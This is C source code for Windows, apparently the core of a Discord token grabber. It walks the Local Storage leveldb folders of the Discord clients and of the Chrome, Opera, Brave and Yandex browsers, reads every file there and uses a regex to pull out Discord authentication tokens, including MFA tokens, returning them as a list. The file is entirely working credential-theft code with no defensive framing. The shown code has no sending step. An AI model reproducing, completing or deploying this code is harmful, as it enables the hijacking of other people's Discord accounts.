#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <regex.h>
#include <windows.h>

#define PATH_BUFFER_SIZE MAX_PATH

static char *getDiscordPath() {
    static int8_t i = -1;
    char *paths[] = {
        "!\\Discord\\Local Storage\\leveldb",
        "!\\discordcanary\\Local Storage\\leveldb",
        "!\\discordptb\\Local Storage\\leveldb",
        "?\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        "!\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        "?\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        "?\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
        NULL
    };
    static char path[PATH_BUFFER_SIZE] = "";

    i += 1;

    if (paths[i] == NULL) {
        i = -1;
        return NULL;
    }
    
    memset(path, 0, PATH_BUFFER_SIZE);
    
    if (paths[i][0] == '!')
        strcat(path, getenv("APPDATA"));
    else if (paths[i][0] == '?')
        strcat(path, getenv("LOCALAPPDATA"));

    strcat(path, paths[i]+1);
    return path;
}

char **grabDiscordTokens() {
    DIR *dir;
    struct dirent *ent;
    size_t path_size = 0;
    char *path = getDiscordPath();
    FILE *file = NULL;
    size_t filesize = 0;
    uint8_t *filebuffer = 0;
    char *cursor = NULL;
    regex_t preg;                                                    
    regmatch_t pmatch;
    size_t count = 0;
    char **safe = NULL;
    char **tokens = NULL;
    char token[90] = "";

    if (regcomp(&preg, "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}", REG_EXTENDED) != 0)                                  
       return NULL;

    do {
        if ((dir = opendir(path)) != NULL) {
            path_size = strlen(path);
            while ((ent = readdir (dir)) != NULL) {
                if (ent->d_name[0] == '.')
                    continue;
                strcat(path, "\\");
                strcat(path, ent->d_name);

                file = fopen(path, "r");

                if (file) {
                    fseek(file, 0, SEEK_END);
                    filesize = ftell(file);
                    fseek(file, 0, SEEK_SET);

                    filebuffer = calloc(filesize+1, 1);

                    if (filebuffer) {
                        fread(filebuffer, 1, filesize, file);
                        
                        for (size_t i = 0; i < filesize; i++) {
                            if (filebuffer[i] == 0)
                                filebuffer[i] = '.';
                        }

                        cursor = (char *)filebuffer;

                        while (regexec(&preg, cursor, 1, &pmatch, 0) == 0) {
                            cursor += pmatch.rm_so;
                            memcpy(token, cursor, pmatch.rm_eo-pmatch.rm_so);
                            cursor += pmatch.rm_eo-pmatch.rm_so;

                            if (tokens == NULL) {
                                tokens = calloc(2, sizeof(char *));
                                if(tokens == NULL)
                                    break;
                                tokens[0] = strdup(token);
                                count = 1;
                            } else {
                                safe = realloc(tokens, sizeof(char *)*(count+2));

                                if (safe == NULL) {
                                    for (size_t i = 0; tokens[i] != NULL; i++)
                                        free(tokens[i]);
                                    free(tokens);
                                    tokens = NULL;
                                    break;
                                }

                                tokens = safe;
                                tokens[count] = strdup(token);
                                tokens[count+1] = NULL;
                                count++;
                            }
                            
                            memset(token, 0, 90);
                        }

                        free(filebuffer);
                    }
                    
                    fclose(file);
                }

                memset(path+path_size, 0, PATH_BUFFER_SIZE-path_size);
            }
            closedir (dir);
        }
    } while ((path = getDiscordPath()));
    
    regfree(&preg);

    return tokens;
}
